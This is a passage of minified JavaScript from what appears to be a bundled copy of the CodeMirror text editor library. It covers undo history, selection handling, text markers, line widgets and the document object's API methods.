D=it(p.done);for((!D||!D.ranges)&&Lc(i.sel,p.done),w={changes:[up(i,s)],generation:p.generation},p.done.push(w);p.done.length>p.undoDepth;)p.done.shift(),p.done[0].ranges||p.done.shift()}p.done.push(d),p.generation=++p.maxGeneration,p.lastModTime=p.lastSelTime=y,p.lastOp=p.lastSelOp=c,p.lastOrigin=p.lastSelOrigin=s.origin,S||xt(i,"historyAdded")}function rN(i,s,d,c){var p=s.charAt(0);return p=="*"||p=="+"&&d.ranges.length==c.ranges.length&&d.somethingSelected()==c.somethingSelected()&&new Date-i.history.lastSelTime<=(i.cm?i.cm.options.historyEventDelay:500)}function iN(i,s,d,c){var p=i.history,y=c&&c.origin;d==p.lastSelOp||y&&p.lastSelOrigin==y&&(p.lastModTime==p.lastSelTime&&p.lastOrigin==y||rN(i,y,it(p.done),s))?p.done[p.done.length-1]=s:Lc(s,p.done),p.lastSelTime=+new Date,p.lastSelOrigin=y,p.lastSelOp=d,c&&c.clearRedo!==!1&&O1(p.undone)}function Lc(i,s){var d=it(s);d&&d.ranges&&d.equals(i)||s.push(i)}function M1(i,s,d,c){var p=s["spans_"+i.id],y=0;i.iter(Math.max(i.first,d),Math.min(i.first+i.size,c),function(w){w.markedSpans&&((p||(p=s["spans_"+i.id]={}))[y]=w.markedSpans),++y})}function aN(i){if(!i)return null;for(var s,d=0;d<i.length;++d)i[d].marker.explicitlyCleared?s||(s=i.slice(0,d)):s&&s.push(i[d]);return s?s.length?s:null:i}function sN(i,s){var d=s["spans_"+i.id];if(!d)return null;for(var c=[],p=0;p<s.text.length;++p)c.push(aN(d[p]));return c}function B1(i,s){var d=sN(i,s),c=Ph(i,s);if(!d)return c;if(!c)return d;for(var p=0;p<d.length;++p){var y=d[p],w=c[p];if(y&&w)e:for(var S=0;S<w.length;++S){for(var D=w[S],I=0;I<y.length;++I)if(y[I].marker==D.marker)continue e;y.push(D)}else w&&(d[p]=w)}return d}function Ps(i,s,d){for(var c=[],p=0;p<i.length;++p){var y=i[p];if(y.ranges){c.push(d?hr.prototype.deepCopy.call(y):y);continue}var w=y.changes,S=[];c.push({changes:S});for(var D=0;D<w.length;++D){var I=w[D],W=void 0;if(S.push({from:I.from,to:I.to,text:I.text}),s)for(var K in I)(W=K.match(/^spans_(\d+)$/))&&ut(s,Number(W[1]))>-1&&(it(S)[K]=I[K],delete I[K])}}return c}function cp(i,s,d,c){if(c){var p=i.anchor;if(d){var y=Ze(s,p)<0;y!=Ze(d,p)<0?(p=s,s=d):y!=Ze(s,d)<0&&(s=d)}return new yt(p,s)}else return new yt(d||s,s)}function _c(i,s,d,c,p){p==null&&(p=i.cm&&(i.cm.display.shift||i.extend)),Cn(i,new hr([cp(i.sel.primary(),s,d,p)],0),c)}function H1(i,s,d){for(var c=[],p=i.cm&&(i.cm.display.shift||i.extend),y=0;y<i.sel.ranges.length;y++)c[y]=cp(i.sel.ranges[y],s[y],null,p);var w=Ur(i.cm,c,i.sel.primIndex);Cn(i,w,d)}function dp(i,s,d,c){var p=i.sel.ranges.slice(0);p[s]=d,Cn(i,Ur(i.cm,p,i.sel.primIndex),c)}function U1(i,s,d,c){Cn(i,Gi(s,d),c)}function lN(i,s,d){var c={ranges:s.ranges,update:function(p){this.ranges=[];for(var y=0;y<p.length;y++)this.ranges[y]=new yt(Je(i,p[y].anchor),Je(i,p[y].head))},origin:d&&d.origin};return xt(i,"beforeSelectionChange",i,c),i.cm&&xt(i.cm,"beforeSelectionChange",i.cm,c),c.ranges!=s.ranges?Ur(i.cm,c.ranges,c.ranges.length-1):s}function z1(i,s,d){var c=i.history.done,p=it(c);p&&p.ranges?(c[c.length-1]=s,Ic(i,s,d)):Cn(i,s,d)}function Cn(i,s,d){Ic(i,s,d),iN(i,i.sel,i.cm?i.cm.curOp.id:NaN,d)}function Ic(i,s,d){(gn(i,"beforeSelectionChange")||i.cm&&gn(i.cm,"beforeSelectionChange"))&&(s=lN(i,s,d));var c=d&&d.bias||(Ze(s.primary().head,i.sel.primary().head)<0?-1:1);W1(i,$1(i,s,c,!0)),!(d&&d.scroll===!1)&&i.cm&&i.cm.getOption("readOnly")!="nocursor"&&_s(i.cm)}function W1(i,s){s.equals(i.sel)||(i.sel=s,i.cm&&(i.cm.curOp.updateInput=1,i.cm.curOp.selectionChanged=!0,rn(i.cm)),un(i,"cursorActivity",i))}function q1(i){W1(i,$1(i,i.sel,null,!1))}function $1(i,s,d,c){for(var p,y=0;y<s.ranges.length;y++){var w=s.ranges[y],S=s.ranges.length==i.sel.ranges.length&&i.sel.ranges[y],D=Pc(i,w.anchor,S&&S.anchor,d,c),I=w.head==w.anchor?D:Pc(i,w.head,S&&S.head,d,c);(p||D!=w.anchor||I!=w.head)&&(p||(p=s.ranges.slice(0,y)),p[y]=new yt(D,I))}return p?Ur(i.cm,p,s.primIndex):s}function js(i,s,d,c,p){var y=Ye(i,s.line);if(y.markedSpans)for(var w=0;w<y.markedSpans.length;++w){var S=y.markedSpans[w],D=S.marker,I="selectLeft"in D?!D.selectLeft:D.inclusiveLeft,W="selectRight"in D?!D.selectRight:D.inclusiveRight;if((S.from==null||(I?S.from<=s.ch:S.from<s.ch))&&(S.to==null||(W?S.to>=s.ch:S.to>s.ch))){if(p&&(xt(D,"beforeCursorEnter"),D.explicitlyCleared))if(y.markedSpans){--w;continue}else break;if(!D.atomic)continue;if(d){var K=D.find(c<0?1:-1),ie=void 0;if((c<0?W:I)&&(K=Y1(i,K,-c,K&&K.line==s.line?y:null)),K&&K.line==s.line&&(ie=Ze(K,d))&&(c<0?ie<0:ie>0))return js(i,K,s,c,p)}var re=D.find(c<0?-1:1);return(c<0?I:W)&&(re=Y1(i,re,c,re.line==s.line?y:null)),re?js(i,re,s,c,p):null}}return s}function Pc(i,s,d,c,p){var y=c||1,w=js(i,s,d,y,p)||!p&&js(i,s,d,y,!0)||js(i,s,d,-y,p)||!p&&js(i,s,d,-y,!0);return w||(i.cantEdit=!0,ve(i.first,0))}function Y1(i,s,d,c){return d<0&&s.ch==0?s.line>i.first?Je(i,ve(s.line-1)):null:d>0&&s.ch==(c||Ye(i,s.line)).text.length?s.line<i.first+i.size-1?ve(s.line+1,0):null:new ve(s.line,s.ch+d)}function V1(i){i.setSelection(ve(i.firstLine(),0),ve(i.lastLine()),nn)}function G1(i,s,d){var c={canceled:!1,from:s.from,to:s.to,text:s.text,origin:s.origin,cancel:function(){return c.canceled=!0}};return d&&(c.update=function(p,y,w,S){p&&(c.from=Je(i,p)),y&&(c.to=Je(i,y)),w&&(c.text=w),S!==void 0&&(c.origin=S)}),xt(i,"beforeChange",i,c),i.cm&&xt(i.cm,"beforeChange",i.cm,c),c.canceled?(i.cm&&(i.cm.curOp.updateInput=2),null):{from:c.from,to:c.to,text:c.text,origin:c.origin}}function Rs(i,s,d){if(i.cm){if(!i.cm.curOp)return cn(i.cm,Rs)(i,s,d);if(i.cm.state.suppressEdits)return}if(!((gn(i,"beforeChange")||i.cm&&gn(i.cm,"beforeChange"))&&(s=G1(i,s,!0),!s))){var c=Bx&&!d&&iS(i,s.from,s.to);if(c)for(var p=c.length-1;p>=0;--p)Q1(i,{from:c[p].from,to:c[p].to,text:p?[""]:s.text,origin:s.origin});else Q1(i,s)}}function Q1(i,s){if(!(s.text.length==1&&s.text[0]==""&&Ze(s.from,s.to)==0)){var d=sp(i,s);F1(i,s,d,i.cm?i.cm.curOp.id:NaN),co(i,s,d,Ph(i,s));var c=[];Ki(i,function(p,y){!y&&ut(c,p.history)==-1&&(J1(p.history,s),c.push(p.history)),co(p,s,null,Ph(p,s))})}}function jc(i,s,d){var c=i.cm&&i.cm.state.suppressEdits;if(!(c&&!d)){for(var p=i.history,y,w=i.sel,S=s=="undo"?p.done:p.undone,D=s=="undo"?p.undone:p.done,I=0;I<S.length&&(y=S[I],!(d?y.ranges&&!y.equals(i.sel):!y.ranges));I++);if(I!=S.length){for(p.lastOrigin=p.lastSelOrigin=null;;)if(y=S.pop(),y.ranges){if(Lc(y,D),d&&!y.equals(i.sel)){Cn(i,y,{clearRedo:!1});return}w=y}else if(c){S.push(y);return}else break;var W=[];Lc(w,D),D.push({changes:W,generation:p.generation}),p.generation=y.generation||++p.maxGeneration;for(var K=gn(i,"beforeChange")||i.cm&&gn(i.cm,"beforeChange"),ie=function(ge){var ke=y.changes[ge];if(ke.origin=s,K&&!G1(i,ke,!1))return S.length=0,{};W.push(up(i,ke));var Ie=ge?sp(i,ke):it(S);co(i,ke,Ie,B1(i,ke)),!ge&&i.cm&&i.cm.scrollIntoView({from:ke.from,to:Qi(ke)});var Oe=[];Ki(i,function(Pe,Me){!Me&&ut(Oe,Pe.history)==-1&&(J1(Pe.history,ke),Oe.push(Pe.history)),co(Pe,ke,null,B1(Pe,ke))})},re=y.changes.length-1;re>=0;--re){var de=ie(re);if(de)return de.v}}}}function K1(i,s){if(s!=0&&(i.first+=s,i.sel=new hr(Wn(i.sel.ranges,function(p){return new yt(ve(p.anchor.line+s,p.anchor.ch),ve(p.head.line+s,p.head.ch))}),i.sel.primIndex),i.cm)){qn(i.cm,i.first,i.first-s,s);for(var d=i.cm.display,c=d.viewFrom;c<d.viewTo;c++)Yi(i.cm,c,"gutter")}}function co(i,s,d,c){if(i.cm&&!i.cm.curOp)return cn(i.cm,co)(i,s,d,c);if(s.to.line<i.first){K1(i,s.text.length-1-(s.to.line-s.from.line));return}if(!(s.from.line>i.lastLine())){if(s.from.line<i.first){var p=s.text.length-1-(i.first-s.from.line);K1(i,p),s={from:ve(i.first,0),to:ve(s.to.line+p,s.to.ch),text:[it(s.text)],origin:s.origin}}var y=i.lastLine();s.to.line>y&&(s={from:s.from,to:ve(y,Ye(i,y).text.length),text:[s.text[0]],origin:s.origin}),s.removed=Fa(i,s.from,s.to),d||(d=sp(i,s)),i.cm?oN(i.cm,s,c):op(i,s,c),Ic(i,d,nn),i.cantEdit&&Pc(i,ve(i.firstLine(),0))&&(i.cantEdit=!1)}}function oN(i,s,d){var c=i.doc,p=i.display,y=s.from,w=s.to,S=!1,D=y.line;i.options.lineWrapping||(D=wt(Br(Ye(c,y.line))),c.iter(D,w.line+1,function(re){if(re==p.maxLine)return S=!0,!0})),c.sel.contains(s.from,s.to)>-1&&rn(i),op(c,s,d,m1(i)),i.options.lineWrapping||(c.iter(D,y.line+s.text.length,function(re){var de=xc(re);de>p.maxLineLength&&(p.maxLine=re,p.maxLineLength=de,p.maxLineChanged=!0,S=!1)}),S&&(i.curOp.updateMaxLine=!0)),XC(c,y.line),lo(i,400);var I=s.text.length-(w.line-y.line)-1;s.full?qn(i):y.line==w.line&&s.text.length==1&&!P1(i.doc,s)?Yi(i,y.line,"text"):qn(i,y.line,w.line+1,I);var W=gn(i,"changes"),K=gn(i,"change");if(K||W){var ie={from:y,to:w,text:s.text,removed:s.removed,origin:s.origin};K&&un(i,"change",i,ie),W&&(i.curOp.changeObjs||(i.curOp.changeObjs=[])).push(ie)}i.display.selForContextMenu=null}function Os(i,s,d,c,p){var y;c||(c=d),Ze(c,d)<0&&(y=[c,d],d=y[0],c=y[1]),typeof s=="string"&&(s=i.splitLines(s)),Rs(i,{from:d,to:c,text:s,origin:p})}function X1(i,s,d,c){d<i.line?i.line+=c:s<i.line&&(i.line=s,i.ch=0)}function Z1(i,s,d,c){for(var p=0;p<i.length;++p){var y=i[p],w=!0;if(y.ranges){y.copied||(y=i[p]=y.deepCopy(),y.copied=!0);for(var S=0;S<y.ranges.length;S++)X1(y.ranges[S].anchor,s,d,c),X1(y.ranges[S].head,s,d,c);continue}for(var D=0;D<y.changes.length;++D){var I=y.changes[D];if(d<I.from.line)I.from=ve(I.from.line+c,I.from.ch),I.to=ve(I.to.line+c,I.to.ch);else if(s<=I.to.line){w=!1;break}}w||(i.splice(0,p+1),p=0)}}function J1(i,s){var d=s.from.line,c=s.to.line,p=s.text.length-(c-d)-1;Z1(i.done,d,c,p),Z1(i.undone,d,c,p)}function fo(i,s,d,c){var p=s,y=s;return typeof s=="number"?y=Ye(i,Lx(i,s)):p=wt(s),p==null?null:(c(y,p)&&i.cm&&Yi(i.cm,p,d),y)}function ho(i){this.lines=i,this.parent=null;for(var s=0,d=0;d<i.length;++d)i[d].parent=this,s+=i[d].height;this.height=s}ho.prototype={chunkSize:function(){return this.lines.length},removeInner:function(i,s){for(var d=i,c=i+s;d<c;++d){var p=this.lines[d];this.height-=p.height,uS(p),un(p,"delete")}this.lines.splice(i,s)},collapse:function(i){i.push.apply(i,this.lines)},insertInner:function(i,s,d){this.height+=d,this.lines=this.lines.slice(0,i).concat(s).concat(this.lines.slice(i));for(var c=0;c<s.length;++c)s[c].parent=this},iterN:function(i,s,d){for(var c=i+s;i<c;++i)if(d(this.lines[i]))return!0}};function po(i){this.children=i;for(var s=0,d=0,c=0;c<i.length;++c){var p=i[c];s+=p.chunkSize(),d+=p.height,p.parent=this}this.size=s,this.height=d,this.parent=null}po.prototype={chunkSize:function(){return this.size},removeInner:function(i,s){this.size-=s;for(var d=0;d<this.children.length;++d){var c=this.children[d],p=c.chunkSize();if(i<p){var y=Math.min(s,p-i),w=c.height;if(c.removeInner(i,y),this.height-=w-c.height,p==y&&(this.children.splice(d--,1),c.parent=null),(s-=y)==0)break;i=0}else i-=p}if(this.size-s<25&&(this.children.length>1||!(this.children[0]instanceof ho))){var S=[];this.collapse(S),this.children=[new ho(S)],this.children[0].parent=this}},collapse:function(i){for(var s=0;s<this.children.length;++s)this.children[s].collapse(i)},insertInner:function(i,s,d){this.size+=s.length,this.height+=d;for(var c=0;c<this.children.length;++c){var p=this.children[c],y=p.chunkSize();if(i<=y){if(p.insertInner(i,s,d),p.lines&&p.lines.length>50){for(var w=p.lines.length%25+25,S=w;S<p.lines.length;){var D=new ho(p.lines.slice(S,S+=25));p.height-=D.height,this.children.splice(++c,0,D),D.parent=this}p.lines=p.lines.slice(0,w),this.maybeSpill()}break}i-=y}},maybeSpill:function(){if(!(this.children.length<=10)){var i=this;do{var s=i.children.splice(i.children.length-5,5),d=new po(s);if(i.parent){i.size-=d.size,i.height-=d.height;var p=ut(i.parent.children,i);i.parent.children.splice(p+1,0,d)}else{var c=new po(i.children);c.parent=i,i.children=[c,d],i=c}d.parent=i.parent}while(i.children.length>10);i.parent.maybeSpill()}},iterN:function(i,s,d){for(var c=0;c<this.children.length;++c){var p=this.children[c],y=p.chunkSize();if(i<y){var w=Math.min(s,y-i);if(p.iterN(i,w,d))return!0;if((s-=w)==0)break;i=0}else i-=y}}};var mo=function(i,s,d){if(d)for(var c in d)d.hasOwnProperty(c)&&(this[c]=d[c]);this.doc=i,this.node=s};mo.prototype.clear=function(){var i=this.doc.cm,s=this.line.widgets,d=this.line,c=wt(d);if(!(c==null||!s)){for(var p=0;p<s.length;++p)s[p]==this&&s.splice(p--,1);s.length||(d.widgets=null);var y=eo(this);ei(d,Math.max(0,d.height-y)),i&&(tr(i,function(){ey(i,d,-y),Yi(i,c,"widget")}),un(i,"lineWidgetCleared",i,this,c))}},mo.prototype.changed=function(){var i=this,s=this.height,d=this.doc.cm,c=this.line;this.height=null;var p=eo(this)-s;p&&($i(this.doc,c)||ei(c,c.height+p),d&&tr(d,function(){d.curOp.forceUpdate=!0,ey(d,c,p),un(d,"lineWidgetChanged",d,i,wt(c))}))},Cr(mo);function ey(i,s,d){xi(s)<(i.curOp&&i.curOp.scrollTop||i.doc.scrollTop)&&ep(i,d)}function uN(i,s,d,c){var p=new mo(i,d,c),y=i.cm;return y&&p.noHScroll&&(y.display.alignWidgets=!0),fo(i,s,"widget",function(w){var S=w.widgets||(w.widgets=[]);if(p.insertAt==null?S.push(p):S.splice(Math.min(S.length,Math.max(0,p.insertAt)),0,p),p.line=w,y&&!$i(i,w)){var D=xi(w)<i.scrollTop;ei(w,w.height+eo(p)),D&&ep(y,p.height),y.curOp.forceUpdate=!0}return!0}),y&&un(y,"lineWidgetAdded",y,p,typeof s=="number"?s:wt(s)),p}var ty=0,Xi=function(i,s){this.lines=[],this.type=s,this.doc=i,this.id=++ty};Xi.prototype.clear=function(){if(!this.explicitlyCleared){var i=this.doc.cm,s=i&&!i.curOp;if(s&&$a(i),gn(this,"clear")){var d=this.find();d&&un(this,"clear",d.from,d.to)}for(var c=null,p=null,y=0;y<this.lines.length;++y){var w=this.lines[y],S=Xl(w.markedSpans,this);i&&!this.collapsed?Yi(i,wt(w),"text"):i&&(S.to!=null&&(p=wt(w)),S.from!=null&&(c=wt(w))),w.markedSpans=eS(w.markedSpans,S),S.from==null&&this.collapsed&&!$i(this.doc,w)&&i&&ei(w,As(i.display))}if(i&&this.collapsed&&!i.options.lineWrapping)for(var D=0;D<this.lines.length;++D){var I=Br(this.lines[D]),W=xc(I);W>i.display.maxLineLength&&(i.display.maxLine=I,i.display.maxLineLength=W,i.display.maxLineChanged=!0)}c!=null&&i&&this.collapsed&&qn(i,c,p+1),this.lines.length=0,this.explicitlyCleared=!0,this.atomic&&this.doc.cantEdit&&(this.doc.cantEdit=!1,i&&q1(i.doc)),i&&un(i,"markerCleared",i,this,c,p),s&&Ya(i),this.parent&&this.parent.clear()}},Xi.prototype.find=function(i,s){i==null&&this.type=="bookmark"&&(i=1);for(var d,c,p=0;p<this.lines.length;++p){var y=this.lines[p],w=Xl(y.markedSpans,this);if(w.from!=null&&(d=ve(s?y:wt(y),w.from),i==-1))return d;if(w.to!=null&&(c=ve(s?y:wt(y),w.to),i==1))return c}return d&&{from:d,to:c}},Xi.prototype.changed=function(){var i=this,s=this.find(-1,!0),d=this,c=this.doc.cm;!s||!c||tr(c,function(){var p=s.line,y=wt(s.line),w=Uh(c,y);if(w&&(l1(w),c.curOp.selectionChanged=c.curOp.forceUpdate=!0),c.curOp.updateMaxLine=!0,!$i(d.doc,p)&&d.height!=null){var S=d.height;d.height=null;var D=eo(d)-S;D&&ei(p,p.height+D)}un(c,"markerChanged",c,i)})},Xi.prototype.attachLine=function(i){if(!this.lines.length&&this.doc.cm){var s=this.doc.cm.curOp;(!s.maybeHiddenMarkers||ut(s.maybeHiddenMarkers,this)==-1)&&(s.maybeUnhiddenMarkers||(s.maybeUnhiddenMarkers=[])).push(this)}this.lines.push(i)},Xi.prototype.detachLine=function(i){if(this.lines.splice(ut(this.lines,i),1),!this.lines.length&&this.doc.cm){var s=this.doc.cm.curOp;(s.maybeHiddenMarkers||(s.maybeHiddenMarkers=[])).push(this)}},Cr(Xi);function Fs(i,s,d,c,p){if(c&&c.shared)return cN(i,s,d,c,p);if(i.cm&&!i.cm.curOp)return cn(i.cm,Fs)(i,s,d,c,p);var y=new Xi(i,p),w=Ze(s,d);if(c&&vt(c,y,!1),w>0||w==0&&y.clearWhenEmpty!==!1)return y;if(y.replacedWith&&(y.collapsed=!0,y.widgetNode=pe("span",[y.replacedWith],"CodeMirror-widget"),c.handleMouseEvents||y.widgetNode.setAttribute("cm-ignore-events","true"),c.insertLeft&&(y.widgetNode.insertLeft=!0)),y.collapsed){if($x(i,s.line,s,d,y)||s.line!=d.line&&$x(i,d.line,s,d,y))throw new Error("Inserting collapsed marker partially overlapping an existing one");JC()}y.addToHistory&&F1(i,{from:s,to:d,origin:"markText"},i.sel,NaN);var S=s.line,D=i.cm,I;if(i.iter(S,d.line+1,function(K){D&&y.collapsed&&!D.options.lineWrapping&&Br(K)==D.display.maxLine&&(I=!0),y.collapsed&&S!=s.line&&ei(K,0),tS(K,new hc(y,S==s.line?s.ch:null,S==d.line?d.ch:null),i.cm&&i.cm.curOp),++S}),y.collapsed&&i.iter(s.line,d.line+1,function(K){$i(i,K)&&ei(K,0)}),y.clearOnEnter&&fe(y,"beforeCursorEnter",function(){return y.clear()}),y.readOnly&&(ZC(),(i.history.done.length||i.history.undone.length)&&i.clearHistory()),y.collapsed&&(y.id=++ty,y.atomic=!0),D){if(I&&(D.curOp.updateMaxLine=!0),y.collapsed)qn(D,s.line,d.line+1);else if(y.className||y.startStyle||y.endStyle||y.css||y.attributes||y.title)for(var W=s.line;W<=d.line;W++)Yi(D,W,"text");y.atomic&&q1(D.doc),un(D,"markerAdded",D,y)}return y}var go=function(i,s){this.markers=i,this.primary=s;for(var d=0;d<i.length;++d)i[d].parent=this};go.prototype.clear=function(){if(!this.explicitlyCleared){this.explicitlyCleared=!0;for(var i=0;i<this.markers.length;++i)this.markers[i].clear();un(this,"clear")}},go.prototype.find=function(i,s){return this.primary.find(i,s)},Cr(go);function cN(i,s,d,c,p){c=vt(c),c.shared=!1;var y=[Fs(i,s,d,c,p)],w=y[0],S=c.widgetNode;return Ki(i,function(D){S&&(c.widgetNode=S.cloneNode(!0)),y.push(Fs(D,Je(D,s),Je(D,d),c,p));for(var I=0;I<D.linked.length;++I)if(D.linked[I].isParent)return;w=it(y)}),new go(y,w)}function ny(i){return i.findMarks(ve(i.first,0),i.clipPos(ve(i.lastLine())),function(s){return s.parent})}function dN(i,s){for(var d=0;d<s.length;d++){var c=s[d],p=c.find(),y=i.clipPos(p.from),w=i.clipPos(p.to);if(Ze(y,w)){var S=Fs(i,y,w,c.primary,c.primary.type);c.markers.push(S),S.parent=c}}}function fN(i){for(var s=function(c){var p=i[c],y=[p.primary.doc];Ki(p.primary.doc,function(D){return y.push(D)});for(var w=0;w<p.markers.length;w++){var S=p.markers[w];ut(y,S.doc)==-1&&(S.parent=null,p.markers.splice(w--,1))}},d=0;d<i.length;d++)s(d)}var hN=0,$n=function(i,s,d,c,p){if(!(this instanceof $n))return new $n(i,s,d,c,p);d==null&&(d=0),po.call(this,[new ho([new Cs("",null)])]),this.first=d,this.scrollTop=this.scrollLeft=0,this.cantEdit=!1,this.cleanGeneration=1,this.modeFrontier=this.highlightFrontier=d;var y=ve(d,0);this.sel=Gi(y),this.history=new Dc(null),this.id=++hN,this.modeOption=s,this.lineSep=c,this.direction=p=="rtl"?"rtl":"ltr",this.extend=!1,typeof i=="string"&&(i=this.splitLines(i)),op(this,{from:y,to:y,text:i}),Cn(this,Gi(y),nn)};$n.prototype=le(po.prototype,{constructor:$n,iter:function(i,s,d){d?this.iterN(i-this.first,s-i,d):this.iterN(this.first,this.first+this.size,i)},insert:function(i,s){for(var d=0,c=0;c<s.length;++c)d+=s[c].height;this.insertInner(i-this.first,s,d)},remove:function(i,s){this.removeInner(i-this.first,s)},getValue:function(i){var s=Nh(this,this.first,this.first+this.size);return i===!1?s:s.join(i||this.lineSeparator())},setValue:dn(function(i){var s=ve(this.first,0),d=this.first+this.size-1;Rs(this,{from:s,to:ve(d,Ye(this,d).text.length),text:this.splitLines(i),origin:"setValue",full:!0},!0),this.cm&&ro(this.cm,0,0),Cn(this,Gi(s),nn)}),replaceRange:function(i,s,d,c){s=Je(this,s),d=d?Je(this,d):s,Os(this,i,s,d,c)},getRange:function(i,s,d){var c=Fa(this,Je(this,i),Je(this,s));return d===!1?c:d===""?c.join(""):c.join(d||this.lineSeparator())},getLine:function(i){var s=this.getLineHandle(i);return s&&s.text},getLineHandle:function(i){if(Ql(this,i))return Ye(this,i)},getLineNumber:function(i){return wt(i)},getLineHandleVisualStart:function(i){return typeof i=="number"&&(i=Ye(this,i)),Br(i)},lineCount:function(){return this.size},firstLine:function(){return this.first},lastLine:function(){return this.first+this.size-1},clipPos:function(i){return Je(this,i)},getCursor:function(i){var s=this.sel.primary(),d;return i==null||i=="head"?d=s.head:i=="anchor"?d=s.anchor:i=="end"||i=="to"||i===!1?d=s.to():d=s.from(),d},listSelections:function(){return this.sel.ranges},somethingSelected:function(){return this.sel.somethingSelected()},setCursor:dn(function(i,s,d){U1(this,Je(this,typeof i=="number"?ve(i,s||0):i),null,d)}),setSelection:dn(function(i,s,d){U1(this,Je(this,i),Je(this,s||i),d)}),extendSelection:dn(function(i,s,d){_c(this,Je(this,i),s&&Je(this,s),d)}),extendSelections:dn(function(i,s){H1(this,_x(this,i),s)}),extendSelectionsBy:dn(function(i,s){var d=Wn(this.sel.ranges,i);H1(this,_x(this,d),s)}),setSelections:dn(function(i,s,d){if(i.length){for(var c=[],p=0;p<i.length;p++)c[p]=new yt(Je(this,i[p].anchor),Je(this,i[p].head||i[p].anchor));s==null&&(s=Math.min(i.length-1,this.sel.primIndex)),Cn(this,Ur(this.cm,c,s),d)}}),addSelection:dn(function(i,s,d){var c=this.sel.ranges.slice(0);c.push(new yt(Je(this,i),Je(this,s||i))),Cn(this,Ur(this.cm,c,c.length-1),d)}),getSelection:function(i){for(var s=this.sel.ranges,d,c=0;c<s.length;c++){var p=Fa(this,s[c].from(),s[c].to());d=d?d.concat(p):p}return i===!1?d:d.join(i||this.lineSeparator())},getSelections:function(i){for(var s=[],d=this.sel.ranges,c=0;c<d.length;c++){var p=Fa(this,d[c].from(),d[c].to());i!==!1&&(p=p.join(i||this.lineSeparator())),s[c]=p}return s},replaceSelection:function(i,s,d){for(var c=[],p=0;p<this.sel.ranges.length;p++)c[p]=i;this.replaceSelections(c,s,d||"+input")},replaceSelections:dn(function(i,s,d){for(var c=[],p=this.sel,y=0;y<p.ranges.length;y++){var w=p.ranges[y];c[y]={from:w.from(),to:w.to(),text:this.splitLines(i[y]),origin:d}}for(var S=s&&s!="end"&&eN(this,c,s),D=c.length-1;D>=0;D--)Rs(this,c[D]);S?z1(this,S):this.cm&&_s(this.cm)}),undo:dn(function(){jc(this,"undo")}),redo:dn(function(){jc(this,"redo")}),undoSelection:dn(function(){jc(this,"undo",!0)}),redoSelection:dn(function(){jc(this,"redo",!0)}),setExtending:function(i){this.extend=i},getExtending:function(){return this.extend},historySize:function(){for(var i=this.history,s=0,d=0,c=0;c<i.done.length;c++)i.done[c].ranges||++s;for(var p=0;p<i.undone.length;p++)i.undone[p].ranges||++d;return{undo:s,redo:d}},clearHistory:function(){var i=this;this.history=new Dc(this.history),Ki(this,function(s){return s.history=i.history},!0)},markClean:function(){this.cleanGeneration=this.changeGeneration(!0)},changeGeneration:function(i){return i&&(this.history.lastOp=this.history.lastSelOp=this.history.lastOrigin=null),this.history.generation},isClean:function(i){return this.history.generation==(i||this.cleanGeneration)},getHistory:function(){return{done:Ps(this.history.done),undone:Ps(this.history.undone)}},setHistory:function(i){var s=this.history=new Dc(this.history);s.done=Ps(i.done.slice(0),null,!0),s.undone=Ps(i.undone.slice(0),null,!0)},setGutterMarker:dn(function(i,s,d){return fo(this,i,"gutter",function(c){var p=c.gutterMarkers||(c.gutterMarkers={});return p[s]=d,!d&&F(p)&&(c.gutterMarkers=null),!0})}),clearGutter:dn(function(i){var s=this;this.iter(function(d){d.gutterMarkers&&d.gutterMarkers[i]&&fo(s,d,"gutter",function(){return d.gutterMarkers[i]=null,F(d.gutterMarkers)&&(d.gutterMarkers=null),!0})})}),lineInfo:function(i){var s;if(typeof i=="number"){if(!Ql(this,i)||(s=i,i=Ye(this,i),!i))return null}else if(s=wt(i),s==null)return null;return{line:s,handle:i,text:i.text,gutterMarkers:i.gutterMarkers,textClass:i.textClass,bgClass:i.bgClass,wrapClass:i.wrapClass,widgets:i.widgets}},addLineClass:dn(function(i,s,d){return fo(this,i,s=="gutter"?"gutter":"class",function(c){var p=s=="text"?"textClass":s=="background"?"bgClass":s=="gutter"?"gutterClass":"wrapClass";if(!c[p])c[p]=d;else{if(ne(d).test(c[p]))return!1;c[p]+=" "+d}return!0})}),removeLineClass:dn(function(i,s,d){return fo(this,i,s=="gutter"?"gutter":"class",function(c){var p=s=="text"?"textClass":s=="background"?"bgClass":s=="gutter"?"gutterClass":"wrapClass",y=c[p];if(y)if(d==null)c[p]=null;else{var w=y.match(ne(d));if(!w)return!1;var S=w.index+w[0].length;c[p]=y.slice(0,w.index)+(!w.index||S==y.length?"":" ")+y.slice(S)||null}else return!1;return!0})}),addLineWidget:dn(function(i,s,d){return uN(this,i,s,d)}),removeLineWidget:function(i){i.clear()},markText:function(i,s,d){return Fs(this,Je(this,i),Je(this,s),d,d&&d.type||"range")},setBookmark:function(i,s){var d={replacedWith:s&&(s.nodeType==null?s.widget:s),insertLeft:s&&s.insertLeft,clearWhenEmpty:!1,shared:s&&s.shared,handleMouseEvents:s&&s.handleMouseEvents};return i=Je(this,i),Fs(this,i,i,d,"bookmark")},findMarksAt:function(i){i=Je(this,i);var s=[],d=Ye(this,i.line).markedSpans;if(d)for(var c=0;c<d.length;++c){var p=d[c];(p.from==null||p.from<=i.ch)&&(p.to==null||p.to>=i.ch)&&s.push(p.marker.parent||p.marker)}return s},findMarks:function(i,s,d){i=Je(this,i),s=Je(this,s);var c=[],p=i.line;return this.iter(i.line,s.line+1,function(y){var w=y.markedSpans;if(w)for(var S=0;S<w.length;S++){var D=w[S];!(D.to!=null&&p==i.line&&i.ch>=D.to||D.from==null&&p!=i.line||D.from!=null&&p==s.line&&D.from>=s.ch)&&(!d||d(D.marker))&&c.push(D.marker.parent||D.marker)}++p}),c},getAllMarks:function(){var i=[];return this.iter(function(s){var d=s.markedSpans;if(d)for(var c=0;c<d.length;++c)d[c].from!=null&&i.push(d[c].marker)}),i},posFromIndex:function(i){var s,d=this.first,c=this.lineSeparator().length;return this.iter(function(p){var y=p.text.length+c;if(y>i)return s=i,!0;i-=y,++d}),Je(this,ve(d,s))},indexFromPos:function(i){i=Je(this,i);var s=i.ch;if(i.line<this.first||i.ch<0)return 0;var d=this.lineSeparator().length;return this.iter(this.first,i.line,function(c){s+=c.text.length+d}),s},copy:function(i){var s=new $n(Nh(this,this.first,this.first+this.size),this.modeOption,this.first,this.lineSep,this.direction);return s.scrollTop=this.scrollTop,s.scrollLeft=this.scrollLeft,s.sel=this.sel,s.extend=!1,i&&(s.history.undoDepth=this.history.undoDepth,s.setHistory(this.getHistory())),s},linkedDoc:function(i){i||(i={});var 